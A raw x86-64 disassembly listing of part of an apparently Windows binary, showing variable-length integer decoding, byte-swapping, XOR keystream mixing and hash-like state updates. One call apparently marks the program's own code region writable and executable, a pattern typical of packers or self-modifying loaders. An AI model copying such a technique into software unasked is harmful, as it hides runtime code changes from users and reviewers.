   140052d11:	mov    rbx,rax
   140052d14:	lea    rcx,[rax+0x10]
   140052d18:	sub    rdx,0x10
   140052d1c:	mov    QWORD PTR [rbp+0x1138],rdx
   140052d23:	mov    eax,0x0
   140052d28:	cmovae rax,rcx
   140052d2c:	mov    QWORD PTR [rbp+0x1180],rax
   140052d33:	jb     0x14005a158
   140052d39:	mov    rax,QWORD PTR [rbp+0x1178]
   140052d40:	add    rax,0xffffffffffffffbf
   140052d44:	cmp    rax,0xffffffffffffffc0
   140052d48:	jb     0x14005a158
   140052d4e:	cmp    QWORD PTR [rbp+0x1138],0x0
   140052d56:	je     0x14005a158
   140052d5c:	mov    rcx,QWORD PTR [rbp+0x1158]
   140052d63:	lea    rdx,[rbp+0x3b0]
   140052d6a:	call   0x14003ad8d
   140052d6f:	lea    r14,[rbx+0x10]
   140052d73:	mov    rcx,r14
   140052d76:	mov    rdi,QWORD PTR [rbp+0x1138]
   140052d7d:	mov    rdx,rdi
   140052d80:	call   0x14003adcf
   140052d85:	mov    rsi,QWORD PTR [rbp+0x1178]
   140052d8c:	mul    rsi
   140052d8f:	mov    r8,rax
   140052d92:	push   0xffffffffffffffff
   140052d94:	pop    rax
   140052d95:	cmovo  r8,rax
   140052d99:	mov    rcx,r8
   140052d9c:	sub    rcx,0x20
   140052da0:	mov    eax,0x0
   140052da5:	cmovb  rcx,rax
   140052da9:	mov    QWORD PTR [rbp+0xf70],rcx
   140052db0:	mov    QWORD PTR [rbp+0x7d0],r14
   140052db7:	mov    QWORD PTR [rbp+0x7d8],rdi
   140052dbe:	mov    QWORD PTR [rbp+0x7e0],rsi
   140052dc5:	lea    rdx,[rbp+0x208]
   140052dcc:	movups xmm0,XMMWORD PTR [rdx]
   140052dcf:	movups xmm1,XMMWORD PTR [rdx+0x10]
   140052dd3:	lea    rcx,[rbp+0x7e8]
   140052dda:	movups XMMWORD PTR [rcx],xmm0
   140052ddd:	movups XMMWORD PTR [rcx+0x10],xmm1
   140052de1:	mov    rax,QWORD PTR [rdx+0x20]
   140052de5:	mov    QWORD PTR [rcx+0x20],rax
   140052de9:	lea    rcx,[rbp+0x7d8]
   140052df0:	and    QWORD PTR [rcx+0x48],0x0
   140052df5:	movaps XMMWORD PTR [rcx+0x38],xmm7
   140052df9:	mov    QWORD PTR [rbp+0x828],rdi
   140052e00:	mov    rax,QWORD PTR [rbp+0x600]
   140052e07:	mov    QWORD PTR [rbp+0x830],rax
   140052e0e:	mov    rax,QWORD PTR [rbp+0x4f0]
   140052e15:	mov    QWORD PTR [rbp+0x838],rax
   140052e1c:	mov    rax,QWORD PTR [rbp+0x7b8]
   140052e23:	mov    QWORD PTR [rbp+0x840],rax
   140052e2a:	mov    eax,DWORD PTR [rbp+0x3c0]
   140052e30:	mov    DWORD PTR [rcx+0x80],eax
   140052e36:	movaps xmm0,XMMWORD PTR [rbp+0x3b0]
   140052e3d:	movups XMMWORD PTR [rcx+0x70],xmm0
   140052e41:	mov    rax,QWORD PTR [rbp+0xcb0]
   140052e48:	movaps XMMWORD PTR [rax+0x10],xmm7
   140052e4c:	movaps XMMWORD PTR [rax],xmm7
   140052e4f:	mov    QWORD PTR [rbp+0x1148],r8
   140052e56:	mov    QWORD PTR [rbp+0x890],r8
   140052e5d:	lea    rcx,[rbp+0xcc0]
   140052e64:	push   0x4
   140052e66:	pop    rdx
   140052e67:	call   0x14003c111
   140052e6c:	xor    r15d,r15d
   140052e6f:	xor    edi,edi
   140052e71:	xor    r12d,r12d
   140052e74:	xor    r13d,r13d
   140052e77:	xor    r14d,r14d
   140052e7a:	mov    QWORD PTR [rbp+0x1160],0x0
   140052e85:	cmp    QWORD PTR [rbp+0x1160],0x4
   140052e8d:	je     0x140053484
   140052e93:	lea    rax,[r14+0x8]
   140052e97:	cmp    rax,QWORD PTR [rbp+0x1148]
   140052e9e:	jbe    0x140052ea7
   140052ea0:	xor    edx,edx
   140052ea2:	jmp    0x14005346c
   140052ea7:	cmp    r13,0x8
   140052eab:	jae    0x1400533f9
   140052eb1:	cmp    r15,QWORD PTR [rbp+0x828]
   140052eb8:	jae    0x140052efe
   140052eba:	mov    rax,QWORD PTR [rbp+0x7d8]
   140052ec1:	mov    rcx,QWORD PTR [rbp+0x818]
   140052ec8:	cmp    rcx,rax
   140052ecb:	jae    0x140052efe
   140052ecd:	lea    rdx,[rbx+0x10]
   140052ed1:	movzx  r13d,BYTE PTR [rdx+rcx*1]
   140052ed6:	and    r13d,0x7f
   140052eda:	lea    rdx,[rcx+0x1]
   140052ede:	cmp    rdx,rax
   140052ee1:	jae    0x140052f0b
   140052ee3:	movzx  r8d,BYTE PTR [rbx+rcx*1+0x11]
   140052ee9:	test   r8b,r8b
   140052eec:	jns    0x140052f05
   140052eee:	shl    r13,0x7
   140052ef2:	and    r8d,0x7f
   140052ef6:	or     r13,r8
   140052ef9:	mov    rcx,rdx
   140052efc:	jmp    0x140052eda
   140052efe:	xor    edx,edx
   140052f00:	jmp    0x140053388
   140052f05:	inc    rcx
   140052f08:	mov    rax,rcx
   140052f0b:	mov    QWORD PTR [rbp+0x818],rax
   140052f12:	mov    rax,r13
   140052f15:	shr    rax,0x8
   140052f19:	mov    rsi,r13
   140052f1c:	shr    rsi,0x28
   140052f20:	movaps XMMWORD PTR [rbp+0x740],xmm7
   140052f27:	movaps XMMWORD PTR [rbp+0x730],xmm7
   140052f2e:	movaps XMMWORD PTR [rbp+0x720],xmm7
   140052f35:	movaps XMMWORD PTR [rbp+0x710],xmm7
   140052f3c:	mov    DWORD PTR [rbp+0x1060],eax
   140052f42:	lea    rax,[rip+0x3510f]        # 0x140088058
   140052f49:	mov    QWORD PTR [rsp+0x20],rax
   140052f4e:	lea    rcx,[rbp+0x710]
   140052f55:	push   0x4
   140052f57:	pop    rdx
   140052f58:	lea    r8,[rbp+0x1060]
   140052f5f:	mov    r9,rdx
   140052f62:	call   0x1400638fe
   140052f67:	mov    BYTE PTR [rbp+0x714],sil
   140052f6e:	mov    rsi,QWORD PTR [rbp+0x7f0]
   140052f75:	cmp    QWORD PTR [rbp+0x838],rsi
   140052f7c:	jbe    0x1400530a8
   140052f82:	mov    r9,QWORD PTR [rbp+0x7f8]
   140052f89:	cmp    r9,0x4
   140052f8d:	ja     0x140059d9c
   140052f93:	mov    rcx,QWORD PTR [rbp+0x800]
   140052f9a:	cmp    rcx,0x5
   140052f9e:	jae    0x140059dae
   140052fa4:	mov    r14,QWORD PTR [rbp+0x838]
   140052fab:	cmp    r14,rsi
   140052fae:	je     0x140059dbc
   140052fb4:	mov    r8,r14
   140052fb7:	mov    eax,DWORD PTR [rbp+rcx*4+0x848]
   140052fbe:	mov    cl,BYTE PTR [rbp+0x808]
   140052fc4:	rol    eax,cl
   140052fc6:	sub    r8,rsi
   140052fc9:	xor    eax,DWORD PTR [rbp+r9*4+0x848]
   140052fd1:	xor    edx,edx
   140052fd3:	div    r8
   140052fd6:	mov    rdi,rdx
   140052fd9:	mov    rax,QWORD PTR [rbp+0x840]
   140052fe0:	mov    QWORD PTR [rbp+0xf80],rax
   140052fe7:	cmp    rsi,0x40
   140052feb:	push   0x40
   140052fed:	pop    rax
   140052fee:	cmovae rsi,rax
   140052ff2:	movaps XMMWORD PTR [rbp+0x1090],xmm7
   140052ff9:	movaps XMMWORD PTR [rbp+0x1080],xmm7
   140053000:	movaps XMMWORD PTR [rbp+0x1070],xmm7
   140053007:	movaps XMMWORD PTR [rbp+0x1060],xmm7
   14005300e:	lea    rcx,[rbp+0x1060]
   140053015:	mov    rdx,rsi
   140053018:	call   0x14003c0b8
   14005301d:	test   r14,r14
   140053020:	je     0x14005306e
   140053022:	mov    rcx,rax
   140053025:	mov    r8,rdx
   140053028:	mov    rax,rdx
   14005302b:	add    rax,rdi
   14005302e:	mov    r9,QWORD PTR [rbp+0x830]
   140053035:	cmp    rax,r14
   140053038:	jbe    0x140053058
   14005303a:	xor    r10d,r10d
   14005303d:	cmp    r8,r10
   140053040:	je     0x14005306e
   140053042:	lea    rax,[r10+rdi*1]
   140053046:	xor    edx,edx
   140053048:	div    r14
   14005304b:	mov    al,BYTE PTR [r9+rdx*1]
   14005304f:	mov    BYTE PTR [rcx+r10*1],al
   140053053:	inc    r10
   140053056:	jmp    0x14005303d
   140053058:	add    r9,rdi
   14005305b:	xor    eax,eax
   14005305d:	cmp    r8,rax
   140053060:	je     0x14005306e
   140053062:	mov    dl,BYTE PTR [r9+rax*1]
   140053066:	mov    BYTE PTR [rcx+rax*1],dl
   140053069:	inc    rax
   14005306c:	jmp    0x14005305d
   14005306e:	mov    rcx,QWORD PTR [rbp+0x7e8]
   140053075:	xor    eax,eax
   140053077:	cmp    rsi,rax
   14005307a:	je     0x1400530a8
   14005307c:	cmp    rcx,0x3f
   140053080:	ja     0x140059d8e
   140053086:	mov    edx,eax
   140053088:	and    edx,0x7
   14005308b:	mov    dl,BYTE PTR [rbp+rdx*1+0xf80]
   140053092:	xor    dl,BYTE PTR [rbp+rax*1+0x1060]
   140053099:	inc    rax
   14005309c:	mov    BYTE PTR [rbp+rcx*1+0x710],dl
   1400530a3:	inc    rcx
   1400530a6:	jmp    0x140053077
   1400530a8:	movaps XMMWORD PTR [rbp+0xfb0],xmm7
   1400530af:	movaps XMMWORD PTR [rbp+0xfa0],xmm7
   1400530b6:	movaps XMMWORD PTR [rbp+0xf90],xmm7
   1400530bd:	movaps XMMWORD PTR [rbp+0xf80],xmm7
   1400530c4:	xor    eax,eax
   1400530c6:	cmp    rax,0x40
   1400530ca:	je     0x1400530e2
   1400530cc:	mov    ecx,DWORD PTR [rbp+rax*1+0x710]
   1400530d3:	bswap  ecx
   1400530d5:	mov    DWORD PTR [rbp+rax*1+0xf80],ecx
   1400530dc:	add    rax,0x4
   1400530e0:	jmp    0x1400530c6
   1400530e2:	movups xmm0,XMMWORD PTR [rbp+0x848]
   1400530e9:	mov    eax,DWORD PTR [rbp+0x858]
   1400530ef:	movups XMMWORD PTR [rbp+0x1060],xmm0
   1400530f6:	mov    DWORD PTR [rbp+0x1070],eax
   1400530fc:	and    DWORD PTR [rbp+0x1074],0x0
   140053103:	movaps xmm0,XMMWORD PTR [rbp+0xf80]
   14005310a:	movaps xmm1,XMMWORD PTR [rbp+0xf90]
   140053111:	movaps xmm2,XMMWORD PTR [rbp+0xfa0]
   140053118:	movaps xmm3,XMMWORD PTR [rbp+0xfb0]
   14005311f:	lea    rax,[rbp+0x1078]
   140053126:	movups XMMWORD PTR [rax+0x30],xmm3
   14005312a:	movups XMMWORD PTR [rax+0x20],xmm2
   14005312e:	movups XMMWORD PTR [rax+0x10],xmm1
   140053132:	movups XMMWORD PTR [rax],xmm0
   140053135:	call   0x140064214
   14005313a:	mov    al,BYTE PTR [rip+0x4594d]        # 0x140098a8d
   140053140:	cmp    al,0x1
   140053142:	je     0x14005318b
   140053144:	movzx  eax,al
   140053147:	cmp    eax,0x2
   14005314a:	je     0x140053231
   140053150:	and    DWORD PTR [rbp+0x610],0x0
   140053157:	lea    rcx,[rip+0xfffffffffffadf22]        # 0x140001080
   14005315e:	mov    rdx,QWORD PTR [rbp+0x1150]
   140053165:	push   0x40
   140053167:	pop    r8
   140053169:	lea    r9,[rbp+0x610]
   140053170:	call   QWORD PTR [rip+0x41692]        # 0x140094808
   140053176:	test   eax,eax
   140053178:	sete   cl
   14005317b:	inc    cl
   14005317d:	mov    BYTE PTR [rip+0x4590a],cl        # 0x140098a8d
   140053183:	test   eax,eax
   140053185:	je     0x140053231
   14005318b:	mov    al,BYTE PTR [rip+0x45a27]        # 0x140098bb8
   140053191:	cmp    al,0x1
   140053193:	je     0x1400531b8
   140053195:	movzx  eax,al
   140053198:	test   eax,eax
   14005319a:	jne    0x140053231
   1400531a0:	call   0x140065d51
   1400531a5:	test   rax,rax
   1400531a8:	sete   cl
   1400531ab:	inc    cl
   1400531ad:	mov    BYTE PTR [rip+0x45a05],cl        # 0x140098bb8
   1400531b3:	test   rax,rax
   1400531b6:	je     0x140053231
   1400531b8:	call   0x140064227
   1400531bd:	mov    eax,0xc8c291de
   1400531c2:	xchg   DWORD PTR [rip+0x45918],eax        # 0x140098ae0
   1400531c8:	call   QWORD PTR [rip+0x41482]        # 0x140094650
   1400531ce:	mov    eax,eax
   1400531d0:	mov    QWORD PTR [rip+0x44e29],rax        # 0x140098000
   1400531d7:	lea    rcx,[rbp+0x1060]
   1400531de:	push   0xffffffffffffffff
   1400531e0:	pop    rdx
   1400531e1:	call   0x14002b840
   1400531e6:	xor    eax,eax
   1400531e8:	xchg   DWORD PTR [rip+0x458f2],eax        # 0x140098ae0
   1400531ee:	mov    BYTE PTR [rip+0x45899],0x0        # 0x140098a8e
   1400531f5:	mov    eax,DWORD PTR [rbp+0x1060]
   1400531fb:	add    DWORD PTR [rbp+0x848],eax
   140053201:	mov    eax,DWORD PTR [rbp+0x1064]
   140053207:	add    DWORD PTR [rbp+0x84c],eax
   14005320d:	mov    eax,DWORD PTR [rbp+0x1068]
   140053213:	add    DWORD PTR [rbp+0x850],eax
   140053219:	mov    eax,DWORD PTR [rbp+0x106c]
   14005321f:	add    DWORD PTR [rbp+0x854],eax
   140053225:	mov    eax,DWORD PTR [rbp+0x1070]
   14005322b:	add    DWORD PTR [rbp+0x858],eax
   140053231:	mov    BYTE PTR [rip+0x45854],0x0        # 0x140098a8c
   140053238:	movaps XMMWORD PTR [rbp+0x1080],xmm7
   14005323f:	movaps XMMWORD PTR [rbp+0x1070],xmm7
   140053246:	movaps XMMWORD PTR [rbp+0x1060],xmm7
   14005324d:	xor    eax,eax
   14005324f:	cmp    rax,0x14
   140053253:	je     0x14005326b
   140053255:	mov    ecx,DWORD PTR [rbp+rax*1+0x848]
   14005325c:	bswap  ecx
   14005325e:	mov    DWORD PTR [rbp+rax*1+0x1060],ecx
   140053265:	add    rax,0x4
   140053269:	jmp    0x14005324f
   14005326b:	mov    rsi,QWORD PTR [rbp+0x7e0]
   140053272:	mov    eax,r13d
   140053275:	shr    eax,0x3
   140053278:	and    eax,0x1f
   14005327b:	lea    rcx,[rax+rbp*1]
   14005327f:	add    rcx,0x1060
   140053286:	xor    r8d,r8d
   140053289:	xor    edx,edx
   14005328b:	xor    eax,eax
   14005328d:	cmp    r8,0x10
   140053291:	je     0x1400532ac
   140053293:	shld   rax,rdx,0x8
   140053298:	mov    r9,rdx
   14005329b:	shl    r9,0x8
   14005329f:	movzx  edx,BYTE PTR [rcx+r8*1]
   1400532a4:	inc    r8
   1400532a7:	or     rdx,r9
   1400532aa:	jmp    0x14005328d
   1400532ac:	push   0xffffffffffffffff
   1400532ae:	pop    r8
   1400532b0:	mov    r9,r8
   1400532b3:	mov    ecx,esi
   1400532b5:	shl    r9,cl
   1400532b8:	cmp    rsi,0x40
   1400532bc:	not    r9
   1400532bf:	cmovae r9,r8
   1400532c3:	and    r13d,0x7
   1400532c7:	lea    ecx,[rsi+r13*1]
   1400532cb:	neg    cl
   1400532cd:	shrd   rdx,rax,cl
   1400532d1:	shr    rax,cl
   1400532d4:	test   cl,0x40
   1400532d7:	cmove  rax,rdx
   1400532db:	and    rax,r9
   1400532de:	mov    r15,QWORD PTR [rbp+0x820]
   1400532e5:	lea    r10,[rsi+0x7]
   1400532e9:	bswap  rax
   1400532ec:	shr    r10,0x3
   1400532f0:	mov    QWORD PTR [rbp+0xf80],rax
   1400532f7:	mov    r8,r15
   1400532fa:	imul   r8,r10
   1400532fe:	push   0x8
   140053300:	pop    rcx
   140053301:	sub    rcx,r10
   140053304:	dec    r10
   140053307:	mov    rax,QWORD PTR [rbp+0x1158]
   14005330e:	lea    r11,[rax+r8*1]
   140053312:	mov    rax,r8
   140053315:	xor    edx,edx
   140053317:	push   0x14
   140053319:	pop    rdi
   14005331a:	div    rdi
   14005331d:	cmp    rcx,0x8
   140053321:	je     0x140053347
   140053323:	cmp    r10,0x7
   140053327:	ja     0x140059d80
   14005332d:	imul   rax,rax,0xffffffffffffffec
   140053331:	mov    al,BYTE PTR [r11+rax*1]
   140053335:	xor    BYTE PTR [rbp+rcx*1+0xf80],al
   14005333c:	inc    rcx
   14005333f:	inc    r11
   140053342:	inc    r8
   140053345:	jmp    0x140053312
   140053347:	mov    rdx,QWORD PTR [rbp+0xf80]
   14005334e:	bswap  rdx
   140053351:	and    rdx,r9
   140053354:	inc    r15
   140053357:	mov    QWORD PTR [rbp+0x820],r15
   14005335e:	mov    rax,QWORD PTR [rbp+0x890]
   140053365:	mov    QWORD PTR [rbp+0x1148],rax
   14005336c:	mov    r14,QWORD PTR [rbp+0x888]
   140053373:	mov    r13,QWORD PTR [rbp+0x880]
   14005337a:	mov    rdi,QWORD PTR [rbp+0x870]
   140053381:	mov    r12,QWORD PTR [rbp+0x878]
   140053388:	mov    rax,QWORD PTR [rbp+0x1148]
   14005338f:	sub    rax,r14
   140053392:	sub    rax,r13
   140053395:	cmp    rax,rsi
   140053398:	cmovae rax,rsi
   14005339c:	cmp    rax,0x1
   1400533a0:	adc    rax,0x0
   1400533a4:	mov    ecx,esi
   1400533a6:	sub    ecx,eax
   1400533a8:	and    cl,0x3f
   1400533ab:	cmp    rsi,rax
   1400533ae:	movzx  ecx,cl
   1400533b1:	mov    r8d,0x0
   1400533b7:	cmovbe ecx,r8d
   1400533bb:	shr    rdx,cl
   1400533be:	mov    ecx,eax
   1400533c0:	shld   r12,rdi,cl
   1400533c4:	shl    rdi,cl
   1400533c7:	test   al,0x40
   1400533c9:	cmovne r12,rdi
   1400533cd:	mov    ecx,0x0
   1400533d2:	cmove  rcx,rdi
   1400533d6:	or     rcx,rdx
   1400533d9:	mov    QWORD PTR [rbp+0x878],r12
   1400533e0:	mov    QWORD PTR [rbp+0x870],rcx
   1400533e7:	add    r13,rax
   1400533ea:	mov    QWORD PTR [rbp+0x880],r13
   1400533f1:	mov    rdi,rcx
   1400533f4:	jmp    0x140052ea7
   1400533f9:	add    r13,0xfffffffffffffff8
   1400533fd:	mov    rax,rdi
   140053400:	mov    ecx,r13d
   140053403:	shrd   rax,r12,cl
   140053407:	mov    rdx,r12
   14005340a:	shr    rdx,cl
   14005340d:	push   0xffffffffffffffff
   14005340f:	pop    r9
   140053411:	mov    r8,r9
   140053414:	shl    r8,cl
   140053417:	test   r13b,0x40
   14005341b:	cmove  rdx,rax
   14005341f:	mov    rax,r9
   140053422:	cmovne rax,r8
   140053426:	mov    ecx,0x0
   14005342b:	cmove  rcx,r8
   14005342f:	mov    QWORD PTR [rbp+0x880],r13
   140053436:	not    rcx
   140053439:	not    rax
   14005343c:	and    rax,r12
   14005343f:	and    rcx,rdi
   140053442:	test   r13,r13
   140053445:	cmove  rcx,r13
   140053449:	cmove  rax,r13
   14005344d:	mov    QWORD PTR [rbp+0x878],rax
   140053454:	mov    QWORD PTR [rbp+0x870],rcx
   14005345b:	add    r14,0x8
   14005345f:	mov    QWORD PTR [rbp+0x888],r14
   140053466:	mov    rdi,rcx
   140053469:	mov    r12,rax
   14005346c:	inc    QWORD PTR [rbp+0x1160]
   140053473:	lea    rcx,[rbp+0xcc0]
   14005347a:	call   0x14003c141
   14005347f:	jmp    0x140052e85
   140053484:	mov    r12,QWORD PTR [rbp+0xcc0]
   14005348b:	mov    r13,QWORD PTR [rbp+0xcc8]
   140053492:	mov    rdi,QWORD PTR [rbp+0xcd0]
   140053499:	mov    rcx,r13
   14005349c:	mov    rdx,rdi
   14005349f:	xor    r8d,r8d
   1400534a2:	lea    r9,[rip+0x34b4f]        # 0x140087ff8
   1400534a9:	call   0x14003c1d3
   1400534ae:	movzx  r14d,BYTE PTR [rax]
   1400534b2:	mov    rcx,r13
   1400534b5:	mov    rdx,rdi
   1400534b8:	push   0x1
   1400534ba:	pop    r8
   1400534bc:	lea    r9,[rip+0x34b4d]        # 0x140088010
   1400534c3:	call   0x14003c1d3
   1400534c8:	movzx  esi,BYTE PTR [rax]
   1400534cb:	mov    rcx,r13
   1400534ce:	mov    rdx,rdi
   1400534d1:	push   0x2
   1400534d3:	pop    r8
   1400534d5:	lea    r9,[rip+0x34b4c]        # 0x140088028
   1400534dc:	call   0x14003c1d3
   1400534e1:	movzx  r15d,BYTE PTR [rax]
   1400534e5:	mov    rcx,r13
   1400534e8:	mov    rdx,rdi
   1400534eb:	push   0x3
   1400534ed:	pop    r8
   1400534ef:	lea    r9,[rip+0x34b4a]        # 0x140088040
   1400534f6:	call   0x14003c1d3
   1400534fb:	movzx  eax,BYTE PTR [rax]
   1400534fe:	shl    eax,0x18
   140053501:	shl    r15d,0x10
   140053505:	shl    esi,0x8
   140053508:	or     rsi,r14
   14005350b:	or     rsi,r15
   14005350e:	or     rsi,rax
   140053511:	mov    rcx,QWORD PTR [rbp+0xf70]
   140053518:	shr    rcx,0x3
   14005351c:	inc    rcx
   14005351f:	mov    rax,rsi
   140053522:	xor    edx,edx
   140053524:	div    rcx
   140053527:	lea    rax,[rdx*8+0x20]
   14005352f:	mov    QWORD PTR [rbp+0x890],rax
   140053536:	mov    QWORD PTR [rbp+0x810],rdx
   14005353d:	mov    ecx,0xc8
   140053542:	lea    r14,[rbp+0x1060]
   140053549:	mov    rdi,r14
   14005354c:	lea    rsi,[rbp+0x7d8]
   140053553:	rep movs BYTE PTR [rdi],BYTE PTR [rsi]
   140053555:	mov    rcx,r12
   140053558:	mov    rdx,r13
   14005355b:	call   0x14006f7f7
   140053560:	lea    rax,[rbx+0x10]
   140053564:	mov    QWORD PTR [rbp+0xd10],rax
   14005356b:	mov    ecx,0xc8
   140053570:	lea    rdi,[rbp+0xd18]
   140053577:	mov    rsi,r14
   14005357a:	rep movs BYTE PTR [rdi],BYTE PTR [rsi]
   14005357c:	mov    r12,QWORD PTR [rbp+0xd50]
   140053583:	sub    r12,0x82
   14005358a:	mov    eax,0x0
   14005358f:	cmovb  r12,rax
   140053593:	cmp    r12,0x1
   140053597:	mov    QWORD PTR [rbp+0x6a8],r12
   14005359e:	adc    r12,0x0
   1400535a2:	mov    QWORD PTR [rbp+0x7a0],r12
   1400535a9:	shr    r12,0x4
   1400535ad:	cmp    r12,0x1
   1400535b1:	adc    r12,0x0
   1400535b5:	lea    rcx,[rbp+0x710]
   1400535bc:	push   0x40
   1400535be:	pop    rdx
   1400535bf:	call   0x14003c111
   1400535c4:	xor    r14d,r14d
   1400535c7:	cmp    r14,0x40
   1400535cb:	je     0x140053bdb
   1400535d1:	mov    r8,QWORD PTR [rbp+0xdc8]
   1400535d8:	mov    r9,QWORD PTR [rbp+0xdd0]
   1400535df:	lea    rax,[r8+0x8]
   1400535e3:	cmp    rax,r9
   1400535e6:	jbe    0x1400535ef
   1400535e8:	xor    edx,edx
   1400535ea:	jmp    0x140053bc7
   1400535ef:	mov    rax,QWORD PTR [rbp+0xdc0]
   1400535f6:	cmp    rax,0x8
   1400535fa:	jae    0x140053b53
   140053600:	mov    rcx,QWORD PTR [rbp+0xd60]
   140053607:	cmp    rcx,QWORD PTR [rbp+0xd68]
   14005360e:	jae    0x140053654
   140053610:	mov    rcx,QWORD PTR [rbp+0xd18]
   140053617:	mov    rdx,QWORD PTR [rbp+0xd58]
   14005361e:	cmp    rdx,rcx
   140053621:	jae    0x140053654
   140053623:	lea    rax,[rbx+0x10]
   140053627:	movzx  r13d,BYTE PTR [rax+rdx*1]
   14005362c:	and    r13d,0x7f
   140053630:	lea    rax,[rdx+0x1]
   140053634:	cmp    rax,rcx
   140053637:	jae    0x140053662
   140053639:	movzx  r8d,BYTE PTR [rbx+rdx*1+0x11]
   14005363f:	test   r8b,r8b
   140053642:	jns    0x14005365c
   140053644:	shl    r13,0x7
   140053648:	and    r8d,0x7f
   14005364c:	or     r13,r8
   14005364f:	mov    rdx,rax
   140053652:	jmp    0x140053630
   140053654:	xor    r11d,r11d
   140053657:	jmp    0x140053acf
   14005365c:	inc    rdx
   14005365f:	mov    rcx,rdx
   140053662:	mov    QWORD PTR [rbp+0xd58],rcx
   140053669:	mov    rax,r13
   14005366c:	shr    rax,0x8
   140053670:	mov    rsi,r13
   140053673:	shr    rsi,0x28
   140053677:	movaps XMMWORD PTR [rbp+0xfb0],xmm7
   14005367e:	movaps XMMWORD PTR [rbp+0xfa0],xmm7
   140053685:	movaps XMMWORD PTR [rbp+0xf90],xmm7
   14005368c:	movaps XMMWORD PTR [rbp+0xf80],xmm7
   140053693:	mov    DWORD PTR [rbp+0x7d0],eax
   140053699:	lea    rax,[rip+0x349b8]        # 0x140088058
   1400536a0:	mov    QWORD PTR [rsp+0x20],rax
   1400536a5:	lea    rcx,[rbp+0xf80]
   1400536ac:	push   0x4
   1400536ae:	pop    rdx
   1400536af:	lea    r8,[rbp+0x7d0]
   1400536b6:	mov    r9,rdx
   1400536b9:	call   0x1400638fe
   1400536be:	mov    BYTE PTR [rbp+0xf84],sil
   1400536c5:	mov    rsi,QWORD PTR [rbp+0xd30]
   1400536cc:	cmp    QWORD PTR [rbp+0xd78],rsi
   1400536d3:	jbe    0x140053803
   1400536d9:	mov    r9,QWORD PTR [rbp+0xd38]
   1400536e0:	cmp    r9,0x4
   1400536e4:	ja     0x140059d9c
   1400536ea:	mov    rcx,QWORD PTR [rbp+0xd40]
   1400536f1:	cmp    rcx,0x5
   1400536f5:	jae    0x140059dae
   1400536fb:	mov    r8,QWORD PTR [rbp+0xd78]
   140053702:	cmp    r8,rsi
   140053705:	je     0x140059dbc
   14005370b:	mov    eax,DWORD PTR [rbp+rcx*4+0xd88]
   140053712:	mov    cl,BYTE PTR [rbp+0xd48]
   140053718:	rol    eax,cl
   14005371a:	sub    r8,rsi
   14005371d:	xor    eax,DWORD PTR [rbp+r9*4+0xd88]
   140053725:	xor    edx,edx
   140053727:	div    r8
   14005372a:	mov    rdi,rdx
   14005372d:	mov    rax,QWORD PTR [rbp+0xd80]
   140053734:	mov    QWORD PTR [rbp+0x1060],rax
   14005373b:	cmp    rsi,0x40
   14005373f:	push   0x40
   140053741:	pop    rax
   140053742:	cmovae rsi,rax
   140053746:	movaps XMMWORD PTR [rbp+0x800],xmm7
   14005374d:	movaps XMMWORD PTR [rbp+0x7f0],xmm7
   140053754:	movaps XMMWORD PTR [rbp+0x7e0],xmm7
   14005375b:	movaps XMMWORD PTR [rbp+0x7d0],xmm7
   140053762:	lea    rcx,[rbp+0x7d0]
   140053769:	mov    rdx,rsi
   14005376c:	call   0x14003c0b8
   140053771:	mov    r10,QWORD PTR [rbp+0xd78]
   140053778:	test   r10,r10
   14005377b:	je     0x1400537c9
   14005377d:	mov    rcx,rax
   140053780:	mov    r8,rdx
   140053783:	mov    rax,rdx
   140053786:	add    rax,rdi
   140053789:	mov    r9,QWORD PTR [rbp+0xd70]
   140053790:	cmp    rax,r10
   140053793:	jbe    0x1400537b3
   140053795:	xor    r11d,r11d
   140053798:	cmp    r8,r11
   14005379b:	je     0x1400537c9
   14005379d:	lea    rax,[r11+rdi*1]
   1400537a1:	xor    edx,edx
   1400537a3:	div    r10
   1400537a6:	mov    al,BYTE PTR [r9+rdx*1]
   1400537aa:	mov    BYTE PTR [rcx+r11*1],al
   1400537ae:	inc    r11
   1400537b1:	jmp    0x140053798
   1400537b3:	add    r9,rdi
   1400537b6:	xor    eax,eax
   1400537b8:	cmp    r8,rax
   1400537bb:	je     0x1400537c9
   1400537bd:	mov    dl,BYTE PTR [r9+rax*1]
   1400537c1:	mov    BYTE PTR [rcx+rax*1],dl
   1400537c4:	inc    rax
   1400537c7:	jmp    0x1400537b8
   1400537c9:	mov    rcx,QWORD PTR [rbp+0xd28]
   1400537d0:	xor    eax,eax
   1400537d2:	cmp    rsi,rax
   1400537d5:	je     0x140053803
   1400537d7:	cmp    rcx,0x3f
   1400537db:	ja     0x140059d8e
   1400537e1:	mov    edx,eax
   1400537e3:	and    edx,0x7
   1400537e6:	mov    dl,BYTE PTR [rbp+rdx*1+0x1060]
   1400537ed:	xor    dl,BYTE PTR [rbp+rax*1+0x7d0]
   1400537f4:	inc    rax
   1400537f7:	mov    BYTE PTR [rbp+rcx*1+0xf80],dl
   1400537fe:	inc    rcx
   140053801:	jmp    0x1400537d2
   140053803:	movaps XMMWORD PTR [rbp+0x1090],xmm7
   14005380a:	movaps XMMWORD PTR [rbp+0x1080],xmm7
   140053811:	movaps XMMWORD PTR [rbp+0x1070],xmm7
   140053818:	movaps XMMWORD PTR [rbp+0x1060],xmm7
   14005381f:	xor    eax,eax
   140053821:	cmp    rax,0x40
   140053825:	je     0x14005383d
   140053827:	mov    ecx,DWORD PTR [rbp+rax*1+0xf80]
   14005382e:	bswap  ecx
   140053830:	mov    DWORD PTR [rbp+rax*1+0x1060],ecx
   140053837:	add    rax,0x4
   14005383b:	jmp    0x140053821
   14005383d:	movups xmm0,XMMWORD PTR [rbp+0xd88]
   140053844:	mov    eax,DWORD PTR [rbp+0xd98]
   14005384a:	movups XMMWORD PTR [rbp+0x7d0],xmm0
   140053851:	mov    DWORD PTR [rbp+0x7e0],eax
   140053857:	and    DWORD PTR [rbp+0x7e4],0x0
   14005385e:	movaps xmm0,XMMWORD PTR [rbp+0x1060]
   140053865:	movaps xmm1,XMMWORD PTR [rbp+0x1070]
   14005386c:	movaps xmm2,XMMWORD PTR [rbp+0x1080]
   140053873:	movaps xmm3,XMMWORD PTR [rbp+0x1090]
   14005387a:	lea    rax,[rbp+0x7e8]
   140053881:	movups XMMWORD PTR [rax+0x30],xmm3
   140053885:	movups XMMWORD PTR [rax+0x20],xmm2
   140053889:	movups XMMWORD PTR [rax+0x10],xmm1
   14005388d:	movups XMMWORD PTR [rax],xmm0
   140053890:	call   0x140064214
   140053895:	mov    al,BYTE PTR [rip+0x451f2]        # 0x140098a8d
   14005389b:	cmp    al,0x1
   14005389d:	je     0x1400538e6
   14005389f:	movzx  eax,al
